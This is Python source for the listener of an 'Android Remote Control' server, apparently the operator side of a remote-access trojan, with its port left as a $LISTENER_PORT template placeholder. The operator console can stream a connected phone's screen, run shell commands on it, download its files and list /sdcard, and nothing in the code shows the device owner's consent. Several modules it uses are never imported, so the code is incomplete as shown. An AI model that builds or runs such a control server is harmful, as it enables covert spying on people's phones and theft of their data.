import queue
import time
import os
import sys

# Configuration
SERVER_IP = "0.0.0.0"  # Listen on all interfaces
SERVER_PORT = $LISTENER_PORT
BUFFER_SIZE = 65536

class VideoViewer:
    """Simple video viewer window"""
    def __init__(self):
        self.root = tk.Tk()
        self.root.title(f"Android Stream - Port {SERVER_PORT}")
        self.root.geometry("800x600")
        
        # Create canvas
        self.canvas = tk.Canvas(self.root, bg='black')
        self.canvas.pack(fill=tk.BOTH, expand=True)
        
        # Image queue
        self.image_queue = queue.Queue()
        self.current_image = None
        self.running = True
        
        # Start update loop
        self.update()
        
        # Handle window close
        self.root.protocol("WM_DELETE_WINDOW", self.on_close)
    
    def on_close(self):
        self.running = False
        self.root.destroy()
    
    def update(self):
        """Update the display"""
        try:
            # Check for new images
            while True:
                img = self.image_queue.get_nowait()
                self.current_image = img
        except queue.Empty:
            pass
        
        # Display current image
        if self.current_image is not None and self.running:
            self.display_image(self.current_image)
        
        # Schedule next update
        if self.running:
            self.root.after(50, self.update)
    
    def display_image(self, img):
        """Display image on canvas"""
        try:
            # Get canvas size
            canvas_width = self.canvas.winfo_width()
            canvas_height = self.canvas.winfo_height()
            
            if canvas_width > 1 and canvas_height > 1:
                # Resize image to fit canvas
                img_resized = cv2.resize(img, (canvas_width, canvas_height))
                
                # Convert to PhotoImage
                img_rgb = cv2.cvtColor(img_resized, cv2.COLOR_BGR2RGB)
                img_pil = Image.fromarray(img_rgb)
                img_tk = ImageTk.PhotoImage(img_pil)
                
                # Update canvas
                self.canvas.delete("all")
                self.canvas.create_image(
                    canvas_width//2, canvas_height//2,
                    anchor=tk.CENTER, image=img_tk
                )
                self.canvas.image = img_tk  # Keep a reference
        except Exception as e:
            print(f"Display error: {e}")
    
    def show_image(self, img):
        """Add image to queue"""
        if self.running:
            self.image_queue.put(img)
    
    def run(self):
        """Start the viewer"""
        self.root.mainloop()

class ClientHandler:
    """Handle individual client connections"""
    def __init__(self, client_socket, address):
        self.socket = client_socket
        self.address = address
        self.running = True
        self.viewer = None
        self.streaming = False
    
    def handle(self):
        """Main handler loop"""
        print(f"\n[+] New connection from {self.address}")
        
        # Send welcome message
        self.send("WELCOME:Android Remote Control v1.0")
        
        # Start command thread
        cmd_thread = threading.Thread(target=self.command_loop)
        cmd_thread.daemon = True
        cmd_thread.start()
        
        # Main receive loop
        while self.running:
            try:
                if self.streaming:
                    # Receive video frame
                    self.receive_frame()
                else:
                    # Receive text commands
                    data = self.socket.recv(1024).decode().strip()
                    if data:
                        print(f"\r[CLIENT] {data}\n{self.address[0]}> ", end="")
            except socket.timeout:
                pass
            except Exception as e:
                if self.running:
                    print(f"\n[!] Error: {e}")
                break
        
        self.cleanup()
    
    def receive_frame(self):
        """Receive and display a video frame"""
        try:
            # Read frame size (4 bytes)
            size_data = self.socket.recv(4)
            if len(size_data) < 4:
                return
            
            frame_size = struct.unpack('!I', size_data)[0]
            
            # Read frame data
            frame_data = b''
            remaining = frame_size
            while remaining > 0:
                chunk = self.socket.recv(min(4096, remaining))
                if not chunk:
                    break
                frame_data += chunk
                remaining -= len(chunk)
            
            # Decode and display frame
            if len(frame_data) == frame_size and self.viewer:
                nparr = np.frombuffer(frame_data, np.uint8)
                img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
                if img is not None:
                    self.viewer.show_image(img)
        except Exception as e:
            print(f"\n[!] Frame error: {e}")
            self.streaming = False
    
    def command_loop(self):
        """Handle user commands"""
        while self.running:
            try:
                cmd = input(f"{self.address[0]}> ")
                
                if cmd == "help":
                    self.show_help()
                
                elif cmd == "stream":
                    self.send("START_STREAM")
                    self.streaming = True
                    
                    # Start viewer
                    self.viewer = VideoViewer()
                    viewer_thread = threading.Thread(target=self.viewer.run)
                    viewer_thread.daemon = True
                    viewer_thread.start()
                    print("[*] Streaming started")
                
                elif cmd == "stop":
                    self.send("STOP_STREAM")
                    self.streaming = False
                    if self.viewer:
                        self.viewer.running = False
                    print("[*] Streaming stopped")
                
                elif cmd.startswith("shell "):
                    self.send(f"SHELL:{cmd[6:]}")
                
                elif cmd.startswith("get "):
                    self.send(f"GET:{cmd[4:]}")
                
                elif cmd == "ls":
                    self.send("LIST:/sdcard")
                
                elif cmd.startswith("ls "):
                    self.send(f"LIST:{cmd[3:]}")
                
                elif cmd == "info":
                    self.send("INFO")
                
                elif cmd == "ping":
                    self.send("PING")
                
                elif cmd == "exit":
                    self.send("EXIT")
                    self.running = False
                    break
                
                else:
                    print("Unknown command. Type 'help'")
            
            except Exception as e:
                print(f"Command error: {e}")
                break
    
    def send(self, message):
        """Send a message to the client"""
        try:
            self.socket.send((message + "\n").encode())
        except:
            pass
    
    def show_help(self):
        """Show help menu"""
        print("""
╔════════════════════════════════════════════╗
║           AVAILABLE COMMANDS               ║
╠════════════════════════════════════════════╣
║ stream     - Start screen streaming        ║
║ stop       - Stop screen streaming         ║
║ shell <cmd>- Execute shell command         ║
║ get <file> - Download file                 ║
║ ls [path]  - List directory                ║
║ info       - Get device info               ║
║ ping       - Test connection                ║
║ exit       - Disconnect                     ║
╚════════════════════════════════════════════╝
        """)
    
    def cleanup(self):
        """Clean up resources"""
        self.running = False
        if self.viewer:
            self.viewer.running = False
        try:
            self.socket.close()
        except:
            pass
        print(f"\n[-] Disconnected from {self.address}")

class Server:
    """Main server class"""
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.running = True
    
    def start(self):
        """Start the server"""
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server.bind((self.host, self.port))
            server.listen(5)
            server.settimeout(1)
            
            print(f"\n{chr(27)}[92m")
            print("╔══════════════════════════════════════════╗")
            print("║     ANDROID REMOTE CONTROL SERVER       ║")
            print("╚══════════════════════════════════════════╝")
            print(f"{chr(27)}[0m")
            print(f"Server IP: {self.get_local_ip()}")
            print(f"Server Port: {self.port}")
            print("\nWaiting for connections...\n")
            
            while self.running:
                try:
                    client, address = server.accept()
                    client.settimeout(1)
                    
                    # Handle client in new thread
                    handler = ClientHandler(client, address)
                    thread = threading.Thread(target=handler.handle)
                    thread.daemon = True
                    thread.start()
                    
                except socket.timeout:
                    pass
                except KeyboardInterrupt:
                    self.running = False
                    break
                except Exception as e:
                    print(f"Server error: {e}")
            
            server.close()
            print("\nServer stopped")
            
        except Exception as e:
            print(f"Failed to start server: {e}")
            return
    
    def get_local_ip(self):
        """Get local IP address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"

if __name__ == "__main__":
    # Start server
    server = Server("0.0.0.0", $LISTENER_PORT)
    
    try:
        server.start()
    except KeyboardInterrupt:
        print("\n\nServer stopped by user")
